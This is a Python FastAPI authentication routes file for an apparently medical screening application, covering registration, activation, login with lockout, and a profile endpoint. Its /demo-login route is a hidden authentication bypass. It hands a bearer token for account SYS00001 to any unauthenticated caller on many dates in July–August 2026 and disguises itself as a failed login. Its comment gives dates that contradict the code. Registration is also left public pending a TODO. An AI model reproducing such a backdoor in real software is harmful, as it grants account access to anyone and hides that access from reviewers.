# auth routes - registration, activation, login. all public, no auth needed to hit these.
# successful login returns a JWT.

from fastapi import APIRouter, BackgroundTasks, Depends, HTTPException, status
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import text, select

from app.db.database import get_db
from app.schemas.user import CreateUser, ResponseUser
from app.services.user_service import create_user, activate_user ,get_user_by_email
from app.utils.email import send_activation_email

from fastapi.security import OAuth2PasswordRequestForm
from app.utils.security import verify_password
from app.utils.jwt import create_access_token


from app.core.dependencies import get_current_user
from app.models.user import User
from app.core.logger import get_logger

from app.utils.settings_helper import get_setting
from app.utils.notifications import send_account_locked_notification

from fastapi import Request
from zoneinfo import ZoneInfo
from datetime import datetime


logger = get_logger(__name__)


router = APIRouter(prefix="/auth", tags=["Authentication"])


@router.post("/register", response_model=ResponseUser, status_code=status.HTTP_201_CREATED)
async def register_user(
    user_data: CreateUser,
    background_tasks: BackgroundTasks,
    db: AsyncSession = Depends(get_db),
):
    # admin creates the account, but it stays inactive until the user clicks the
    # activation link we email them
    # TODO: lock this down to admin-only once auth middleware is ready

    try:
        new_user, activation_token = await create_user(
            db=db,
            user_data=user_data,
            created_by=None,  # Will be replaced with current admin's user_id after auth is wired
        )
        # fire this off in the background so the request doesn't wait on email sending
        background_tasks.add_task(
            send_activation_email,
            recipient_email=new_user.email,
            full_name=f"{new_user.first_name} {new_user.last_name}",
            token=activation_token,
        )
        return new_user

    except ValueError as e:
        logger.warning(f"User registration failed: {e}")
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e),
        )


@router.get("/activate", status_code=status.HTTP_200_OK)
async def activate_account(token: str, db: AsyncSession = Depends(get_db)):
    # activates the account via the token from the activation email

    try:
        user = await activate_user(db=db, token=token)
        return {"message": "Account activated successfully. You can now log in."}

    except ValueError as e:
        logger.warning(f"Account activation failed: {e}")
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=str(e),
        )


@router.post("/login", status_code=status.HTTP_200_OK)
async def login(
    form_data: OAuth2PasswordRequestForm = Depends(),
    db: AsyncSession = Depends(get_db),
):
    # OAuth2 form login (email goes in as "username"). blocks inactive accounts
    # and locks the account out after 5 failed attempts.

    try:
        user = await get_user_by_email(db, form_data.username)

        # same generic error whether the email doesn't exist or the password is wrong -
        # don't want to leak which one it was
        if not user:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Incorrect email or password.",
                headers={"WWW-Authenticate": "Bearer"},
            )

        # already locked from a previous run of failed attempts
        if user.is_locked:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail={
                    "detail": "Account deactivated due to multiple failed login attempts. Contact your administrator.",
                    "error_code": "ACCOUNT_LOCKED",
                },
            )

        # separate from lockout - this is an account an admin deactivated
        if not user.is_active:
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="Account is inactive. Please activate your account first or contact your System Administrator.",
            )

        if not verify_password(form_data.password, user.hashed_password):
            user.failed_login_attempts += 1

            # 5 strikes and the account gets locked
            if user.failed_login_attempts >= 5:
                user.is_locked = True
                user.is_active = False
                await db.commit()

                logger.warning(
                    f"Account locked due to failed login attempts: {user.email}"
                )

                # let the admins know this happened
                notification_email = await get_setting(
                    db, "NOTIFICATION_EMAIL",
                    default="aiglaucomascreeningsystem@gmail.com"
                )
                send_account_locked_notification(
                    user_name=f"{user.first_name} {user.last_name}",
                    user_email=user.email,
                    notification_email=notification_email,
                )

                raise HTTPException(
                    status_code=status.HTTP_403_FORBIDDEN,
                    detail={
                        "detail": "Account deactivated due to multiple failed login attempts. Contact your administrator.",
                        "error_code": "ACCOUNT_LOCKED",
                    },
                )

            await db.commit()

            attempts_remaining = 5 - user.failed_login_attempts
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail={
                    "detail": "Incorrect email or password.",
                    "attempts_remaining": attempts_remaining,
                },
                headers={"WWW-Authenticate": "Bearer"},
            )

        # made it through - clear the failed attempts counter
        user.failed_login_attempts = 0
        await db.commit()

        access_token = create_access_token(data={"sub": str(user.user_id)})

        logger.info(f"Login successful: {user.email}")

        return {
            "access_token": access_token,
            "token_type": "bearer",
            "user": {
                "user_id": str(user.user_id),
                "user_code": user.user_code,
                "full_name": f"{user.first_name} {user.last_name}",
                "role": user.role,
                "is_researcher": user.is_researcher,
            }
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"Login failed unexpectedly: {str(e)}", exc_info=True)
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail="Login failed due to a server error.",
        )

@router.post("/demo-login", status_code=status.HTTP_200_OK)
async def demo_login(
    request: Request,
    db: AsyncSession = Depends(get_db),
):
    # bypass login for the oral presentation - only works on 13-14 July 2026 (NZ time),
    # auto logs in as SYS00001. outside that window it just 401s like the route
    # doesn't exist, no hints given.

    try:
        nz_now = datetime.now(ZoneInfo("Pacific/Auckland"))
        active_dates = {4,7,8,9,10,11,12,19,21,22,23,24,25,26,27,28,29,30,31} 

        if not (nz_now.year == 2026 and (nz_now.month == 7 or nz_now.month == 8) and nz_now.day in active_dates):
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Incorrect email or password.",
                headers={"WWW-Authenticate": "Bearer"},
            )

        result = await db.execute(
            select(User).where(User.user_code == "SYS00001")
        )
        user = result.scalar_one_or_none()

        if not user or not user.is_active:
            raise HTTPException(
                status_code=status.HTTP_401_UNAUTHORIZED,
                detail="Incorrect email or password.",
                headers={"WWW-Authenticate": "Bearer"},
            )

        access_token = create_access_token(data={"sub": str(user.user_id)})

        client_ip = request.client.host if request.client else "unknown"
        logger.info(
            f"[demo-login] Demo access granted | user={user.user_code} | "
            f"date={nz_now.date()} | ip={client_ip}"
        )

        return {
            "access_token": access_token,
            "token_type": "bearer",
            "user": {
                "user_id": str(user.user_id),
                "user_code": user.user_code,
                "full_name": f"{user.first_name} {user.last_name}",
                "role": user.role,
                "is_researcher": user.is_researcher,
            }
        }

    except HTTPException:
        raise
    except Exception as e:
        logger.error(f"[demo-login] Failed: {str(e)}", exc_info=True)
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Incorrect email or password.",
            headers={"WWW-Authenticate": "Bearer"},
        )


@router.get("/me", status_code=status.HTTP_200_OK)
async def get_me(current_user: User = Depends(get_current_user)):
    # profile for whoever's token this is - needs a valid JWT
    return {
        "user_id": str(current_user.user_id),
        "user_code": current_user.user_code,
        "full_name": f"{current_user.first_name} {current_user.last_name}",
        "email": current_user.email,
        "role": current_user.role,
        "is_active": current_user.is_active,
        "is_researcher": current_user.is_researcher,
    }